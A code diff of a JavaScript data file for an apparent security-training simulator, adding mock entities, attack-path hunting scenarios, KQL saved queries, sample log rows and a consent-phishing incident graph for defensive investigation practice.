+  { id:'svc-sql', type:'Service account', label:'svc-sql-reporting', risk:'high', vulnerable:true, riskScore:true, detail:'Kerberoastable service account used by the reporting tier.' },
+  { id:'svc-backup', type:'Service account', label:'svc-backup', risk:'medium', riskScore:true, detail:'Backup service identity with legacy RDP permissions.' },
+  { id:'device-fin-wks07', type:'Device', label:'FIN-WKS-07', risk:'high', vulnerable:true, riskScore:true, detail:'Finance workstation with suspicious PowerShell activity.' },
+  { id:'device-byod22', type:'Device', label:'BYOD-22', risk:'medium', internet:true, riskScore:true, detail:'Personally managed device with a recent storage session.' },
+  { id:'device-admin01', type:'Device', label:'ADM-WKS-01', risk:'medium', critical:true, riskScore:true, detail:'Privileged-access workstation used by Tier 0 staff.' },
+  { id:'device-edge01', type:'Device', label:'EDGE-WKS-01', risk:'high', vulnerable:true, internet:true, riskScore:true, detail:'Internet-exposed endpoint with an overdue security update.' },
+  { id:'server-finfs02', type:'Server', label:'FIN-FS-02', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Critical finance file server containing payroll exports.' },
+  { id:'server-dc01', type:'Domain controller', label:'DC-01', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Domain controller representing the domain-compromise target.' },
+  { id:'group-helpdesk', type:'Group', label:'Tier 1 Helpdesk', risk:'medium', riskScore:true, detail:'Support group with delegated account-management rights.' },
+  { id:'group-storage', type:'Group', label:'Sensitive Storage Readers', risk:'medium', sensitive:true, riskScore:true, detail:'Group that grants read access to sensitive storage.' },
+  { id:'group-domainadmins', type:'Group', label:'Domain Admins', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Highest-privilege on-premises administrative group.' },
+  { id:'group-cloud', type:'Group', label:'Cloud Resource Contributors', risk:'high', critical:true, riskScore:true, detail:'Synced group carrying broad cloud-resource permissions.' },
+  { id:'app-docviewer', type:'OAuth application', label:'DocViewer Pro', risk:'high', vulnerable:true, riskScore:true, detail:'Unverified OAuth app with mailbox and file permissions.' },
+  { id:'app-syncbridge', type:'OAuth application', label:'SyncBridge Legacy', risk:'high', critical:true, riskScore:true, detail:'Hybrid-owned app able to authenticate as a privileged service principal.' },
+  { id:'sp-storage', type:'Service principal', label:'sp-storage-export', risk:'high', critical:true, riskScore:true, detail:'Automation identity with permissions on storage and SQL.' },
+  { id:'sp-automation', type:'Service principal', label:'sp-prod-automation', risk:'medium', critical:true, riskScore:true, detail:'Production automation identity with cluster and vault roles.' },
+  { id:'storage-payroll', type:'Storage account', label:'stpayrollprod', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production storage containing payroll and tax exports.' },
+  { id:'storage-research', type:'Storage account', label:'stresearcharchive', risk:'medium', sensitive:true, riskScore:true, detail:'Research archive marked as containing sensitive data.' },
+  { id:'kv-prod', type:'Key vault', label:'kv-prod-finance', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production vault containing finance application secrets.' },
+  { id:'sql-finance', type:'SQL data store', label:'sql-finance-prod', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Finance SQL store reachable through shared automation identities.' },
+  { id:'k8s-payments', type:'Kubernetes cluster', label:'aks-payments-prod', risk:'high', critical:true, vulnerable:true, riskScore:true, detail:'Critical payments cluster with a vulnerable administration path.' },
+  { id:'repo-payments', type:'Azure DevOps repository', label:'Payments/API', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Repository containing payment-service deployment definitions.' },
+  { id:'tenant-contoso', type:'Active Directory domain', label:'contoso.local', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Domain object whose replication rights enable DCSync.' },
+  { id:'ip-76', type:'IP address', label:'76.21.55.4', risk:'high', internet:true, riskScore:true, detail:'External address observed during the phishing-to-OAuth incident.' },
+  { id:'mailbox-jane', type:'Mailbox', label:'Jane Doe mailbox', risk:'high', sensitive:true, riskScore:true, detail:'Mailbox accessible through the risky OAuth application.' },
+  { id:'subscription-prod', type:'Cloud resource', label:'Production subscription', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production cloud scope inherited by contributor principals.' },
+];
+
 const HUNTING_GRAPH_SCENARIOS = [
-  { name:'Paths between two entities',
-    input:'Start entity, end entity',
-    question:'Is there a traversable path from one entity to another?' },
-  { name:'Users with access to sensitive data',
-    input:'Target storage account',
-    question:'Which users can reach a sensitive storage asset?' },
-  { name:'Data exfiltration by a device',
-    input:'Source device',
-    question:'What storage accounts can a given device access?' },
-  { name:'Paths to a highly critical Kubernetes cluster',
-    input:'Target Kubernetes cluster',
-    question:'Which actors can reach a critical cluster?' },
-  { name:'Identities with access to Azure DevOps repositories',
-    input:'Target ADO repository',
-    question:'Who can read or write a specific repository?' },
-  { name:'Nodes in highest number of paths to SQL data stores',
-    input:'None',
-    question:'Which entities are high-leverage choke points for SQL data access?' },
-  { name:'Critical users with access to sensitive storage',
-    input:'None',
-    question:'Which privileged identities can touch sensitive data?' },
-  { name:'Entities that have access to a key vault',
-    input:'Target key vault',
-    question:'Who can directly or indirectly reach a Key Vault?' },
+  { id:'attack-path-critical-asset', name:'Attack paths to critical asset', question:'Which routes could allow lateral movement to a critical asset?', techniques:['Lateral movement','Exploratory'],
+    inputs:[{ key:'target', label:'Target critical asset', bindNode:'kv-prod', options:['kv-prod','sql-finance','k8s-payments'] }],
+    nodes:['guest-kim','group-cloud','sp-automation','kv-prod','user-alex'],
+    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'kv-prod',label:'has role on'},{from:'user-alex',to:'sp-automation',label:'has permissions to',shortest:false}] },
+  { id:'entity-relationship-map', name:'Entity relationship map', question:'What direct incoming and outgoing relationships surround an entity?', techniques:['Exploratory'],
+    inputs:[{ key:'source', label:'Source entity', bindNode:'user-jane', options:['user-jane','device-fin-wks07','app-docviewer'] }],
+    nodes:['user-jane','device-fin-wks07','app-docviewer','ip-76','mailbox-jane'],
+    edges:[{from:'ip-76',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'device-fin-wks07',label:'frequently logged in by'},{from:'user-jane',to:'app-docviewer',label:'has permissions to'},{from:'app-docviewer',to:'mailbox-jane',label:'has permissions to'}] },
+  { id:'paths-between-entities', name:'Paths between two entities', question:'Is there a traversable path from one selected entity to another?', techniques:['Lateral movement','Exploratory'],
+    inputs:[{ key:'start', label:'Start data source', bindNode:'device-fin-wks07', options:['device-fin-wks07','device-byod22','guest-kim'] },{ key:'target', label:'Target data source', bindNode:'storage-payroll', options:['storage-payroll','kv-prod','sql-finance'] }],
+    nodes:['device-fin-wks07','user-jane','group-storage','storage-payroll','app-docviewer'],
+    edges:[{from:'device-fin-wks07',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'group-storage',label:'member of'},{from:'group-storage',to:'storage-payroll',label:'has permissions to'},{from:'user-jane',to:'app-docviewer',label:'has permissions to',shortest:false},{from:'app-docviewer',to:'storage-payroll',label:'has permissions to',shortest:false}] },
+  { id:'access-key-vaults', name:'Access to key vaults', question:'Which entities have direct or indirect access to a selected key vault?', techniques:['Lateral movement','Collection'],
+    inputs:[{ key:'target', label:'Target key vault', bindNode:'kv-prod', options:['kv-prod'] }],
+    nodes:['guest-kim','group-cloud','sp-automation','kv-prod','device-admin01'],
+    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'kv-prod',label:'has role on'},{from:'device-admin01',to:'kv-prod',label:'has permissions to',shortest:false}] },
+  { id:'users-sensitive-data', name:'Users with access to sensitive data', question:'Which users can reach a selected sensitive storage account?', techniques:['Lateral movement','Exploratory','Collection'],
+    inputs:[{ key:'target', label:'Target storage account', bindNode:'storage-payroll', options:['storage-payroll','storage-research'] }],
+    nodes:['user-jane','user-alex','group-storage','storage-payroll'],
+    edges:[{from:'user-jane',to:'group-storage',label:'member of'},{from:'user-alex',to:'group-storage',label:'member of'},{from:'group-storage',to:'storage-payroll',label:'has permissions to'}] },
+  { id:'critical-identities-storage', name:'Critical identities with storage access', question:'Which privileged identities can reach sensitive storage?', techniques:['Lateral movement','Collection'], inputs:[],
+    nodes:['user-tier0','group-cloud','sp-storage','storage-payroll','storage-research'],
+    edges:[{from:'user-tier0',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-storage',label:'can authenticate as'},{from:'sp-storage',to:'storage-payroll',label:'has permissions to'},{from:'sp-storage',to:'storage-research',label:'has permissions to',shortest:false}] },
+  { id:'device-exfiltration', name:'Potential data exfiltration by device', question:'Which storage accounts can a selected device access?', techniques:['Exploratory','Collection'],
+    inputs:[{ key:'source', label:'Source device', bindNode:'device-byod22', options:['device-byod22','device-fin-wks07'] }],
+    nodes:['device-byod22','user-jane','app-docviewer','storage-payroll','storage-research'],
+    edges:[{from:'device-byod22',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'app-docviewer',label:'has permissions to'},{from:'app-docviewer',to:'storage-payroll',label:'has permissions to'},{from:'app-docviewer',to:'storage-research',label:'has permissions to',shortest:false}] },
+  { id:'critical-kubernetes', name:'Attack paths to critical Kubernetes clusters', question:'Which actors can reach a highly critical Kubernetes cluster?', techniques:['Privilege escalation','Lateral movement'],
+    inputs:[{ key:'target', label:'Target Kubernetes cluster', bindNode:'k8s-payments', options:['k8s-payments'] }],
+    nodes:['user-alex','repo-payments','sp-automation','k8s-payments','guest-kim'],
+    edges:[{from:'user-alex',to:'repo-payments',label:'has permissions to'},{from:'repo-payments',to:'sp-automation',label:'has credentials of'},{from:'sp-automation',to:'k8s-payments',label:'has role on'},{from:'guest-kim',to:'sp-automation',label:'can authenticate as',shortest:false}] },
+  { id:'azure-devops-access', name:'Access to Azure DevOps repositories', question:'Who can read or write a selected Azure DevOps repository?', techniques:['Collection'],
+    inputs:[{ key:'target', label:'Target ADO repository', bindNode:'repo-payments', options:['repo-payments'] }],
+    nodes:['user-alex','user-jane','group-cloud','repo-payments'],
+    edges:[{from:'user-alex',to:'repo-payments',label:'has permissions to'},{from:'user-jane',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'repo-payments',label:'has permissions to'}] },
+  { id:'sql-choke-points', name:'Choke points to SQL data stores', question:'Which shared nodes appear in the most paths leading to SQL data?', techniques:['Lateral movement','Collection'], inputs:[],
+    nodes:['user-jane','user-alex','group-cloud','sp-storage','sql-finance'],
+    edges:[{from:'user-jane',to:'group-cloud',label:'member of'},{from:'user-alex',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-storage',label:'can authenticate as'},{from:'sp-storage',to:'sql-finance',label:'has permissions to'}] },
+  { id:'oauth-privileged-access', name:'OAuth applications with privileged access', question:'Which hybrid-owned OAuth apps can authenticate as privileged service principals?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
+    nodes:['user-hybrid','app-syncbridge','sp-automation','subscription-prod'],
+    edges:[{from:'user-hybrid',to:'app-syncbridge',label:'owns'},{from:'app-syncbridge',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'subscription-prod',label:'has role on'}] },
+  { id:'paths-sensitive-identities', name:'Paths to sensitive identities', question:'Which non-privileged identities have permission paths to sensitive identities?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
+    nodes:['user-alex','group-helpdesk','user-helpdesk','user-tier0'],
+    edges:[{from:'user-alex',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'has permissions to'},{from:'user-helpdesk',to:'user-tier0',label:'has permissions to'}] },
+  { id:'service-rdp-critical', name:'Service accounts with RDP to critical devices', question:'Which service accounts retain RDP access to critical devices?', techniques:['Lateral movement'], inputs:[],
+    nodes:['svc-backup','device-admin01','server-finfs02'],
+    edges:[{from:'svc-backup',to:'device-admin01',label:'can authenticate to'},{from:'svc-backup',to:'server-finfs02',label:'can authenticate to',shortest:false}] },
+  { id:'kerberoast-critical', name:'Kerberoast paths to critical assets', question:'Where can a Kerberoast-vulnerable account lead after compromise?', techniques:['Privilege escalation','Credential access'], inputs:[],
+    nodes:['device-edge01','svc-sql','group-cloud','sql-finance'],
+    edges:[{from:'device-edge01',to:'svc-sql',label:'has credentials of'},{from:'svc-sql',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sql-finance',label:'has permissions to'}] },
+  { id:'least-privilege', name:'Least privilege access', question:'Which synced users have excessive permissions on cloud resources?', techniques:['Lateral movement','Collection'], inputs:[],
+    nodes:['user-alex','group-cloud','subscription-prod','storage-payroll'],
+    edges:[{from:'user-alex',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'subscription-prod',label:'has role on'},{from:'subscription-prod',to:'storage-payroll',label:'contains'}] },
+  { id:'external-cloud-access', name:'External users with cloud resource access', question:'Which guest accounts have privileged access to cloud resources?', techniques:['Lateral movement','Collection'], inputs:[],
+    nodes:['guest-kim','group-cloud','subscription-prod','kv-prod'],
+    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'subscription-prod',label:'has role on'},{from:'subscription-prod',to:'kv-prod',label:'contains'}] },
+  { id:'domain-compromise', name:'Paths to domain compromise (DCSync)', question:'Which non-privileged identities have hidden paths to domain replication rights?', techniques:['Lateral movement','Privilege escalation','Credential access'], inputs:[],
+    nodes:['user-alex','group-helpdesk','user-helpdesk','tenant-contoso','server-dc01'],
+    edges:[{from:'user-alex',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'can impersonate as'},{from:'user-helpdesk',to:'tenant-contoso',label:'has permissions to'},{from:'tenant-contoso',to:'server-dc01',label:'contains'}] },
+  { id:'domain-admins', name:'Paths to domain admins', question:'Which paths could elevate non-privileged users into Domain Admins?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
+    nodes:['user-alex','group-helpdesk','user-helpdesk','group-domainadmins'],
+    edges:[{from:'user-alex',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'can impersonate as'},{from:'user-helpdesk',to:'group-domainadmins',label:'has permissions to'}] },
+  { id:'exposed-rdp-critical', name:'Exposed users with RDP to critical assets', question:'Which exposed users have multi-step RDP paths to critical assets?', techniques:['Privilege escalation','Lateral movement','Credential access'], inputs:[],
+    nodes:['device-edge01','user-helpdesk','svc-backup','server-finfs02'],
+    edges:[{from:'device-edge01',to:'user-helpdesk',label:'frequently logged in by'},{from:'user-helpdesk',to:'svc-backup',label:'has credentials of'},{from:'svc-backup',to:'server-finfs02',label:'can authenticate to'}] },
+  { id:'asrep-critical', name:'AS-REP roast paths to critical assets', question:'Which AS-REP-vulnerable accounts lead to sensitive on-premises assets?', techniques:['Privilege escalation','Credential access'], inputs:[],
+    nodes:['device-edge01','user-asrep','group-domainadmins','server-dc01'],
+    edges:[{from:'device-edge01',to:'user-asrep',label:'has credentials of'},{from:'user-asrep',to:'group-domainadmins',label:'member of'},{from:'group-domainadmins',to:'server-dc01',label:'has permissions to'}] },
 ];
 
 const HUNTING_GRAPH_FILTERS = [
@@ -992,8 +1399,8 @@ const SAVED_QUERIES = [
     table:'DeviceInfo', description:'Surface endpoints that received external incoming communication.',
     query:`DeviceInfo\n| where IsInternetFacing == true\n| project Timestamp, DeviceName, OSPlatform, PublicIP, IsInternetFacing, ExposureLevel` },
   { name:'Graph app mailbox access after consent',
-    table:'MicrosoftGraphActivityLogs', description:'Review Microsoft Graph calls made by an OAuth app after a risky consent grant.',
-    query:`MicrosoftGraphActivityLogs\n| where AppDisplayName == "DocViewer Pro"\n| project TimeGenerated, UserPrincipalName, AppDisplayName, Operation, RequestUri, IPAddress, ResultStatus` },
+    table:'GraphActivityLogs', description:'Review Graph calls made by an OAuth app after a risky consent grant.',
+    query:`GraphActivityLogs\n| where AppDisplayName == "DocViewer Pro"\n| project TimeGenerated, UserPrincipalName, AppDisplayName, Operation, RequestUri, IPAddress, ResultStatus` },
 ];
 
 const KQL_PRACTICE_ROWS = [
@@ -1064,7 +1471,7 @@ const MOCK_QUERY_RESULTS = {
     { Timestamp:'2026-06-28T07:52:14Z', AccountDisplayName:'aws-prod-breakglass',
       ActionType:'PutBucketAcl', BucketName:'aws-s3-prod-logs', AccessLevel:'public-read' },
   ],
-  MicrosoftGraphActivityLogs: [
+  GraphActivityLogs: [
     { TimeGenerated:'2026-06-28T08:31:00Z', UserPrincipalName:'jane.doe@contoso.com',
       AppDisplayName:'DocViewer Pro', AppId:'b9f2-demo-ad21', Operation:'Mail.Read',
       RequestUri:'/users/jane.doe@contoso.com/messages', IPAddress:'76.21.55.4', ResultStatus:'Success' },
@@ -1156,9 +1563,9 @@ const MOCK_QUERY_RESULTS = {
   ],
   WindowsEvent: [
     { TimeGenerated:'2026-07-06T08:12:00Z', Computer:'DC01', EventID:4624, Channel:'Security',
-      Provider:'Microsoft-Windows-Security-Auditing', RenderedDescription:'Successful logon for CONTOSO\\svc-backup' },
+      Provider:'Windows-Security-Auditing', RenderedDescription:'Successful logon for CONTOSO\\svc-backup' },
     { TimeGenerated:'2026-07-06T08:17:44Z', Computer:'WKS-03', EventID:4688, Channel:'Security',
-      Provider:'Microsoft-Windows-Security-Auditing', RenderedDescription:'Process creation for C:\\Users\\Public\\scanner.exe' },
+      Provider:'Windows-Security-Auditing', RenderedDescription:'Process creation for C:\\Users\\Public\\scanner.exe' },
   ],
   CommonSecurityLog: [
     { TimeGenerated:'2026-07-06T08:20:00Z', DeviceVendor:'Contoso Firewall', DeviceProduct:'EdgeFW',
@@ -1170,14 +1577,14 @@ const MOCK_QUERY_RESULTS = {
   ],
   AzureActivity: [
     { TimeGenerated:'2026-07-06T07:50:00Z', SubscriptionId:'sub-prod-001',
-      Caller:'cloudadmin@contoso.com', OperationNameValue:'Microsoft.Authorization/roleAssignments/write',
-      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-identity', ResourceProviderValue:'Microsoft.Authorization' },
+      Caller:'cloudadmin@contoso.com', OperationNameValue:'Cloud.Authorization/roleAssignments/write',
+      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-identity', ResourceProviderValue:'Cloud.Authorization' },
     { TimeGenerated:'2026-07-06T07:57:31Z', SubscriptionId:'sub-shared-002',
-      Caller:'platformops@contoso.com', OperationNameValue:'Microsoft.Authorization/policyAssignments/write',
-      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-policy', ResourceProviderValue:'Microsoft.Authorization' },
+      Caller:'platformops@contoso.com', OperationNameValue:'Cloud.Authorization/policyAssignments/write',
+      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-policy', ResourceProviderValue:'Cloud.Authorization' },
     { TimeGenerated:'2026-07-06T08:05:44Z', SubscriptionId:'sub-prod-001',
-      Caller:'storage-owner@contoso.com', OperationNameValue:'Microsoft.Storage/storageAccounts/write',
-      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-storage', ResourceProviderValue:'Microsoft.Storage' },
+      Caller:'storage-owner@contoso.com', OperationNameValue:'Cloud.Storage/storageAccounts/write',
+      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-storage', ResourceProviderValue:'Cloud.Storage' },
   ],
   ArchiveDns_CL: ARCHIVE_DNS_AUX_ROWS,
   ArchiveDns_RST: SENTINEL_RESTORE_JOB.results,
@@ -1199,14 +1606,14 @@ bad-demo.example,phish,1
 update.example,benign,3`;
 
 const ASIM_AUTHENTICATION_ROWS = [
-  { TimeGenerated:'2026-07-06T03:44:00Z', EventVendor:'Microsoft', EventProduct:'Windows', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
+  { TimeGenerated:'2026-07-06T03:44:00Z', EventVendor:'Contoso', EventProduct:'Windows', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
     SrcIpAddr:'10.20.4.55', DstIpAddr:'10.20.4.10', SrcHostname:'DC01', DstHostname:'DC01', TargetUserName:'svc-backup', DvcAction:'LogonSuccess', Dvc:'DC01' },
-  { TimeGenerated:'2026-07-06T10:17:58Z', EventVendor:'Microsoft', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
-    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'unknown', DstHostname:'login.microsoftonline.com', TargetUserName:'sam.lee@contoso.com', DvcAction:'MFA satisfied', Dvc:'AAD' },
-  { TimeGenerated:'2026-07-06T13:27:00Z', EventVendor:'Microsoft', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Failure',
-    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'proxy-91-219-236-54', DstHostname:'login.microsoftonline.com', TargetUserName:'sam.lee@contoso.com', DvcAction:'Risky sign-in', Dvc:'AAD' },
-  { TimeGenerated:'2026-07-06T06:40:00Z', EventVendor:'Microsoft', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
-    SrcIpAddr:'185.199.111.12', DstIpAddr:'52.96.0.0', SrcHostname:'aitm-gateway', DstHostname:'login.microsoftonline.com', TargetUserName:'maria.ross@contoso.com', DvcAction:'MFA proxied', Dvc:'AAD' },
+  { TimeGenerated:'2026-07-06T10:17:58Z', EventVendor:'Contoso', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
+    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'unknown', DstHostname:'login.identity.example', TargetUserName:'sam.lee@contoso.com', DvcAction:'MFA satisfied', Dvc:'AAD' },
+  { TimeGenerated:'2026-07-06T13:27:00Z', EventVendor:'Contoso', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Failure',
+    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'proxy-91-219-236-54', DstHostname:'login.identity.example', TargetUserName:'sam.lee@contoso.com', DvcAction:'Risky sign-in', Dvc:'AAD' },
+  { TimeGenerated:'2026-07-06T06:40:00Z', EventVendor:'Contoso', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
+    SrcIpAddr:'185.199.111.12', DstIpAddr:'52.96.0.0', SrcHostname:'aitm-gateway', DstHostname:'login.identity.example', TargetUserName:'maria.ross@contoso.com', DvcAction:'MFA proxied', Dvc:'AAD' },
 ];
 
 const ASIM_AUTHENTICATION_SAVED_QUERIES = [
@@ -1232,7 +1639,7 @@ const ASIM_AUTHENTICATION_SAVED_QUERIES = [
     description:'Show the rows that look like MFA was satisfied through a proxy or AiTM flow.',
     expectedRows:1,
     query:`_Im_Authentication(eventtype="Logon")
-| where DvcAction has "MFA"
+| where DvcAction == "MFA proxied"
 | project TimeGenerated, SrcIpAddr, TargetUserName, DvcAction, Dvc`,
   },
 ];
@@ -1421,18 +1828,56 @@ const KQL_PRACTICE_TASKS = [
 
 const SENTINEL_GRAPH = {
   incidentId:'INC-1042',
-  nodes:[
-    { id:'user-jane', type:'User', label:'jane.doe@contoso.com', risk:'high' },
-    { id:'url-doc', type:'URL', label:'secure-document-portal[.]xyz', risk:'high' },
-    { id:'app-docviewer', type:'App', label:'DocViewer Pro', risk:'medium' },
-    { id:'ip-76', type:'IP', label:'76.21.55.4', risk:'medium' },
-    { id:'mailbox-jane', type:'Mailbox', label:'Jane Doe mailbox', risk:'medium' },
-  ],
-  edges:[
-    { from:'user-jane', to:'url-doc', label:'clicked URL' },
-    { from:'user-jane', to:'app-docviewer', label:'granted consent' },
-    { from:'ip-76', to:'user-jane', label:'sign-in source' },
-    { from:'app-docviewer', to:'mailbox-jane', label:'Mail.ReadWrite' },
+  sourceNodeId:'user-jane',
+  nodes:ATTACK_STORIES['INC-1042'].nodes,
+  edges:ATTACK_STORIES['INC-1042'].edges,
+  initialNodeIds:['mailbox-jane','url-doc','user-jane','consent-grant','app-docviewer','mail-api'],
+  criticalNodeIds:['finance-sp','cfo-mailbox','payroll-sp','m365-admin','legal-onedrive'],
+  positions:{
+    'mailbox-jane':{x:9,y:25},
+    'url-doc':{x:23,y:25},
+    'user-jane':{x:23,y:55},
+    'consent-grant':{x:39,y:55},
+    'app-docviewer':{x:55,y:55},
+    'mail-api':{x:70,y:40},
+    'cfo-mailbox':{x:87,y:12},
+    'hr-mailbox':{x:93,y:33},
+    'finance-sp':{x:72,y:72},
+    'payroll-sp':{x:91,y:64},
+    'm365-admin':{x:92,y:87},
+    'teams-channel':{x:52,y:84},
+    'powerbi-finance':{x:69,y:91},
+    'legal-onedrive':{x:38,y:88},
+  },
+  nodeMeta:{
+    'mailbox-jane':{risk:'high',status:'Access observed',group:'mailboxes',summary:'Graph activity shows the newly consented app reading Jane Doe\'s inbox seconds after the grant.',table:'GraphActivityLogs',firstSeen:'08:24:19 UTC'},
+    'url-doc':{risk:'high',status:'Blocked',summary:'The URL delivered a consent-phishing workflow and is linked to other credential-harvest infrastructure.',table:'UrlClickEvents',firstSeen:'08:11:00 UTC'},
+    'user-jane':{risk:'high',status:'Compromised',summary:'The finance user clicked the phishing URL and approved broad delegated permissions for an unverified application.',table:'SigninLogs',firstSeen:'08:11:42 UTC'},
+    'consent-grant':{risk:'high',status:'Revoked',summary:'Delegated Mail.ReadWrite and Files.Read.All scopes were granted to DocViewer Pro.',table:'AuditLogs',firstSeen:'08:23:00 UTC'},
+    'app-docviewer':{risk:'high',status:'Tenant block pending',summary:'An unverified OAuth application used Jane\'s delegated token to access 365 content.',table:'CloudAppEvents',firstSeen:'08:23:04 UTC'},
+    'mail-api':{risk:'high',status:'Active evidence',summary:'The delegated Mail.ReadWrite permission connects the malicious app to mailboxes Jane can access.',table:'GraphActivityLogs',firstSeen:'08:24:19 UTC'},
+    'finance-sp':{risk:'high',status:'Critical asset',group:'content',summary:'Jane\'s Finance Contributors membership makes quarterly forecast files reachable through Files.Read.All.',response:'Review files read by the app, remove the delegated token, and temporarily restrict Jane\'s access while scoping exposure.',table:'OfficeActivity',firstSeen:'08:26:41 UTC'},
+    'cfo-mailbox':{risk:'high',status:'Critical asset',group:'mailboxes',summary:'Jane has delegate access to the CFO mailbox; the malicious delegated token could read or modify its content.',response:'Audit message reads and inbox-rule changes, then remove Jane\'s delegate access until the identity is recovered.',table:'GraphActivityLogs',firstSeen:'08:27:12 UTC'},
+    'm365-admin':{risk:'medium',status:'Potential path',summary:'The app has no admin role today, but the graph identifies an approval path through an application administrator.',table:'AuditLogs',firstSeen:'Not observed'},
+    'teams-channel':{risk:'medium',status:'Adjacent asset',group:'collaboration',summary:'Finance channel history is adjacent to Jane\'s identity, but no channel read was observed in this incident.',table:'CloudAppEvents',firstSeen:'Not observed'},
+    'payroll-sp':{risk:'high',status:'Critical asset',group:'content',summary:'Payroll files are reachable through an inherited Finance Contributors group and the delegated Files.Read.All scope.',response:'Review file-access events, revoke the application grant, and notify the payroll data owner if reads are confirmed.',table:'OfficeActivity',firstSeen:'08:29:05 UTC'},
+    'hr-mailbox':{risk:'medium',status:'Potential path',group:'mailboxes',summary:'The shared HR mailbox appears because Jane has temporary delegate access; no access event is confirmed.',table:'GraphActivityLogs',firstSeen:'Not observed'},
+    'powerbi-finance':{risk:'medium',status:'Adjacent asset',group:'collaboration',summary:'Finance Power BI workspaces are related to Jane, but the consented scopes do not prove dataset access.',table:'PowerBIActivity',firstSeen:'Not observed'},
+    'legal-onedrive':{risk:'medium',status:'Critical data path',group:'content',summary:'A cross-functional legal folder shared with Jane could be enumerated with the delegated file permission.',response:'Validate whether the app accessed the shared folder and remove stale cross-functional sharing if it is unnecessary.',table:'OfficeActivity',firstSeen:'Not observed'},
+  },
+  edgeEvidence:{
+    'mailbox-jane|url-doc':{source:'EmailUrlInfo + UrlClickEvents',time:'08:11:00 UTC',confidence:'High',detail:'The delivered message contained the URL and the Safe Links record confirms Jane clicked it.'},
+    'url-doc|user-jane':{source:'SigninLogs',time:'08:11:42 UTC',confidence:'High',detail:'A sign-in session for Jane began from 76.21.55.4 immediately after the URL click.'},
+    'user-jane|consent-grant':{source:'AuditLogs',time:'08:23:00 UTC',confidence:'High',detail:'Consent to application operation recorded Jane as the initiating user.'},
+    'consent-grant|app-docviewer':{source:'AuditLogs',time:'08:23:00 UTC',confidence:'High',detail:'The grant lists DocViewer Pro and the Mail.ReadWrite and Files.Read.All delegated scopes.'},
+    'app-docviewer|mail-api':{source:'CloudAppEvents',time:'08:24:19 UTC',confidence:'High',detail:'The app exchanged the delegated grant for Graph mailbox access.'},
+    'mail-api|mailbox-jane':{source:'GraphActivityLogs',time:'08:24:19 UTC',confidence:'High',detail:'A message-list operation targeted Jane Doe\'s mailbox from the new application.'},
+  },
+  learningTasks:[
+    { id:'inspect-user',title:'Inspect the compromised identity',hint:'Select Jane Doe and review why the identity is considered compromised.' },
+    { id:'trace-app',title:'Trace the consent chain',hint:'Select DocViewer Pro or one of the consent relationships.' },
+    { id:'run-blast',title:'Analyze blast radius',hint:'Reveal downstream assets and identify the reachable critical data.' },
+    { id:'respond',title:'Choose a response',hint:'Open a critical node and record a containment or investigation action.' },
   ],
 };
 
@@ -1461,7 +1906,7 @@ const ENTRA_IDENTITY_INVESTIGATIONS = [
       { time:'2026-06-28T13:31:00Z', type:'Impossible travel', risk:'Medium', source:'Entra ID Protection', detail:'Prior successful sign-in from Seattle occurred 42 minutes earlier.' },
     ],
     signIns:[
-      { time:'2026-06-28T12:45:00Z', app:'Microsoft Teams', ip:'198.51.100.18', location:'US', result:'Success', risk:'None' },
+      { time:'2026-06-28T12:45:00Z', app:'Teams', ip:'198.51.100.18', location:'US', result:'Success', risk:'None' },
       { time:'2026-06-28T13:27:00Z', app:'Office 365 Exchange Online', ip:'91.219.236.54', location:'NL', result:'Success', risk:'High' },
       { time:'2026-06-28T13:33:00Z', app:'Azure Portal', ip:'91.219.236.54', location:'NL', result:'Blocked by CA', risk:'High' },
     ],
